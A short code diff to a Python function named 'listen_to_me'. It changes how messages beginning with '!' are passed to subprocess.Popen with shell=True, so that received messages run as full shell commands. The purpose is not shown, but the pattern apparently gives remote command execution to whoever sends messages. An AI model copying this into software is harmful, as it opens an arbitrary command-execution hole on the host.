@@ -407,8 +407,8 @@ def listen_to_me():
 
                 for command in messages:
                     if command.startswith("!"):
-                        do_command = command[1:].split(" ")
-                        command_out = subprocess.Popen(do_command,shell=True, stdout=subprocess.PIPE,
+                        do_command = command[1:]
+                        command_out = subprocess.Popen(do_command, shell=True, stdout=subprocess.PIPE,
                                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                         # command_out_stdout = command_out.stdout.read()
                         # command_out_stderr = command_out.stderr.read()
